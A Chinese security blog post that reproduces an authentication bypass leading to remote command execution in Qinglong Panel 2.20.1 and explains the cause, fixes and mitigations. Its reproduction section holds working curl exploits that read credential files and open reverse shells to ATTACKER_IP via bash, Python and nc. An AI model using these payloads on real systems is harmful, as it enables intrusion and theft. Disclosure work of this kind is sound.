---
title: "青龙面板鉴权绕过漏洞复现 - 从路径大小写到 RCE"
date: 2026-02-28T16:45:00+08:00
tags: ["鉴权绕过", "RCE", "Node.js", "路径遍历"]
categories: ["漏洞复现"]
description: "深度剖析青龙面板最新版鉴权绕过漏洞，利用路径大小写特性绕过 JWT 校验，最终实现未授权远程命令执行。"
image: "/static/security-cover.jpg"
keywords: ["青龙面板", "鉴权绕过", "RCE", "Node.js 安全", "Express 漏洞"]
draft: false
weight: 1
---

> ⚠️ **免责声明**：本文仅用于安全研究与教育目的，请勿将技术用于非法用途。

## 📋 漏洞摘要

| 项目 | 详情 |
|------|------|
| **漏洞名称** | 青龙面板鉴权绕过导致 RCE |
| **影响版本** | Qinglong Panel 2.20.1 |
| **漏洞类型** | 鉴权绕过 → 远程命令执行 |
| **CVE 编号** | 待分配 (2026-02 披露) |
| **危害等级** | 🔴 严重 (Critical) |
| **利用复杂度** | 🟢 低 (无需认证) |

---

## 🎯 漏洞概述

青龙面板 (Qinglong Panel) 是一款流行的定时任务管理面板，广泛应用于脚本管理、自动化任务等场景。

2026 年 2 月，安全研究人员发现青龙面板最新版本存在一处**鉴权绕过漏洞**。攻击者通过构造特殊的路径大小写，可以绕过 JWT 令牌校验，直接访问高权限 API 接口，最终实现**未授权远程命令执行 (RCE)**。

### 核心问题

```typescript
// back/loaders/express.ts
path: [...config.apiWhiteList, /^(?!api\/).*/]

// 问题：正则严格匹配纯小写的 api
// 只要不是 /api/ 开头，就会绕过 JWT 校验
```

自定义鉴权中间件使用的是 `req.path.startsWith()` 判断，它严格区分大小写：

```typescript
if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
    return next();  // 直接放行，跳过 JWT 校验
}
```

因此 `/API/` 这类路径会**跳过令牌校验**，同时因为 **Express 默认大小写不敏感**，`/API/...` 还能正常匹配到 `/api/...` 路由。

---

## 🔬 环境搭建

### 1. 部署漏洞环境

```bash
# 使用 Docker 部署漏洞版本
docker run -d \
  -p 5700:5700 \
  -v $(pwd)/data:/ql/data \
  --name qinglong \
  whyour/qinglong:2.20.1

# 访问面板
# http://localhost:5700
```

### 2. 验证环境

```bash
# 检查版本
curl http://localhost:5700/api/system/version

# 预期输出
{"data":"2.20.1","code":200}
```

---

## 💥 漏洞复现

### 步骤 1: 验证鉴权绕过

**正常情况（需要认证）：**

```bash
# 直接访问 /api/ 路径会被拦截
curl -X PUT "http://localhost:5700/api/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "id"}'

# 响应：401 Unauthorized
{"code":401,"message":"未授权访问"}
```

**利用大小写绕过：**

```bash
# 使用 /API/ (大写) 绕过鉴权
curl -X PUT "http://localhost:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "id"}'

# 响应：200 OK
{
  "code": 200,
  "data": "uid=0(root) gid=0(root) groups=0(root)"
}
```

### 步骤 2: 执行系统命令

**获取系统信息：**

```bash
# 查看当前用户
curl -X PUT "http://localhost:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'

# 查看主机名
curl -X PUT "http://localhost:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "hostname"}'

# 查看环境变量
curl -X PUT "http://localhost:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "env"}'
```

**读取敏感文件：**

```bash
# 读取青龙配置文件
curl -X PUT "http://localhost:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "cat /ql/data/config/auth.json"}'

# 读取系统密码本 (需要 root 权限)
curl -X PUT "http://localhost:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "cat /etc/passwd"}'
```

### 步骤 3: 获取 Shell

**反弹 Shell：**

```bash
# Bash 反弹
curl -X PUT "http://localhost:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"}'

# Python 反弹
curl -X PUT "http://localhost:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\"ATTACKER_IP\"\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"\"/bin/sh\"\",\"\"-i\"\"]);\""}'

# NC 反弹
curl -X PUT "http://localhost:5700/API/system/command-run" \
  -H "Content-Type: application/json" \
  -d '{"command": "nc -e /bin/sh ATTACKER_IP 4444"}'
```

---

## 🔍 技术细节分析

### 1. Express 路由大小写不敏感

Express 框架默认对路由大小写不敏感：

```javascript
const express = require('express');
const app = express();

app.get('/api/test', (req, res) => {
    res.send('Hello');
});

// 以下请求都能匹配到上述路由
// GET /api/test      ✓
// GET /API/test      ✓
// GET /Api/test      ✓
// GET /aPi/TeSt      ✓
```

这是 Express 的默认行为，可以通过 `app.set('case sensitive routing', true)` 启用大小写敏感。

### 2. 鉴权中间件逻辑漏洞

**问题代码：**

```typescript
// back/loaders/express.ts
app.use((req, res, next) => {
    // 白名单路径，不需要鉴权
    if (!['/open/', '/api/'].some((x) => req.path.startsWith(x))) {
        return next();  // 跳过 JWT 校验
    }
    
    // 验证 JWT 令牌
    const token = req.headers.authorization;
    if (!verifyToken(token)) {
        return res.status(401).json({ code: 401, message: '未授权' });
    }
    
    next();
});
```

**绕过原理：**

```
请求路径：/API/system/command-run

1. req.path = '/API/system/command-run'
2. req.path.startsWith('/api/') = false  ← 大小写不匹配
3. 条件为真，执行 next()  ← 跳过 JWT 校验
4. Express 路由匹配：/API/ → /api/  ← 大小写不敏感，成功匹配
5. 执行命令执行接口 ← 未授权访问成功
```

### 3. 可利用 API 接口

青龙面板提供多个危险 API 接口：

| 接口路径 | 功能 | 危险等级 |
|---------|------|---------|
| `/api/system/command-run` | 执行系统命令 | 🔴 严重 |
| `/api/env` | 管理环境变量 | 🟠 高 |
| `/api/repo` | 管理仓库 | 🟠 高 |
| `/api/subscription` | 管理订阅 | 🟡 中 |
| `/api/user` | 用户管理 | 🟠 高 |

---

## 🛡️ 防御建议

### 1. 官方修复方案

**修复鉴权逻辑：**

```typescript
// 修复后：使用正则忽略大小写
const authPaths = [/^\/open\//i, /^\/api\//i];

app.use((req, res, next) => {
    if (!authPaths.some((pattern) => pattern.test(req.path))) {
        return next();
    }
    
    // 验证 JWT 令牌
    const token = req.headers.authorization;
    if (!verifyToken(token)) {
        return res.status(401).json({ code: 401, message: '未授权' });
    }
    
    next();
});
```

**启用大小写敏感路由：**

```typescript
const app = express();
app.set('case sensitive routing', true);  // 启用大小写敏感

// 现在 /API/ 和 /api/ 是两个不同的路由
```

### 2. 临时缓解措施

**方案 1: 反向代理过滤**

```nginx
# Nginx 配置
location / {
    # 强制转换为小写
    set $lower_uri $uri;
    if ($uri ~* ^/(API)/) {
        return 403;  # 拦截大写 API 路径
    }
    
    proxy_pass http://localhost:5700;
}
```

**方案 2: WAF 规则**

```yaml
# ModSecurity 规则
SecRule REQUEST_URI "@rx (?i)/API/" \
    "id:1001,\
    phase:1,\
    deny,\
    status:403,\
    msg:'QL Panel Auth Bypass Attempt'"
```

### 3. 用户侧防护

```bash
# 1. 限制访问来源
iptables -A INPUT -p tcp --dport 5700 -s 127.0.0.1 -j ACCEPT
iptables -A INPUT -p tcp --dport 5700 -j DROP

# 2. 使用强认证
# 修改默认密码
# 启用双因素认证 (如果支持)

# 3. 定期更新
docker pull whyour/qinglong:latest
docker restart qinglong

# 4. 监控日志
tail -f /ql/log/system.log | grep -E "(API|command|auth)"
```

---

## 📊 影响评估

### 受影响版本

| 版本 | 状态 |
|------|------|
| 2.20.1 | ❌ 受影响 |
| 2.20.0 | ❌ 可能受影响 |
| 2.19.x | ⚠️ 待确认 |
| < 2.19 | ⚠️ 待确认 |

### 潜在危害

1. **服务器完全沦陷** - 攻击者可执行任意命令
2. **数据泄露** - 读取配置文件、数据库、密钥
3. **内网渗透** - 以服务器为跳板攻击内网
4. **挖矿/僵尸网络** - 植入恶意程序

### 攻击场景

```
互联网扫描 → 发现 5700 端口 → 利用鉴权绕过 → 执行命令
    → 读取配置 → 获取数据库密码 → 数据泄露
    → 植入后门 → 持久化控制 → 内网横向移动
```

---

## 🔗 相关漏洞案例

### 1. JWT 鉴权绕过常见手法

| 手法 | 描述 | 案例 |
|------|------|------|
| 大小写绕过 | `/API/` vs `/api/` | 本文漏洞 |
| 路径遍历 | `/..//api/` | CVE-2023-XXXX |
| 编码绕过 | URL 编码、Unicode | CVE-2022-XXXX |
| 算法混淆 | `alg: none` | JWT 经典漏洞 |

### 2. Node.js/Express 类似漏洞

- **CVE-2024-29180**: express-fileupload 路径遍历
- **CVE-2022-24999**: Express 原型污染
- **CVE-2024-45590**: app-html 包 RCE

---

## 📝 时间线

| 日期 | 事件 |
|------|------|
| 2026-02-27 | 漏洞首次披露 (GitHub Issue #2934) |
| 2026-02-28 | 漏洞细节公开 |
| 2026-02-28 | 本文发布 |
| TBD | CVE 编号分配 |
| TBD | 官方修复版本发布 |

---

## 📚 参考资料

1. [GitHub Issue #2934](https://github.com/whyour/qinglong/issues/2934)
2. [Express 官方文档 - 路由](https://expressjs.com/en/guide/routing.html)
3. [OWASP - 鉴权绕过](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/)
4. [Node.js 安全最佳实践](https://nodejs.org/en/docs/guides/security/)

---

## 🏷️ Tags

#鉴权绕过 #RCE #青龙面板 #Node.js 安全 #Express #漏洞复现 #渗透测试

---

*本文基于公开披露的漏洞信息编写，旨在提高安全意识。请合法使用安全技术。*
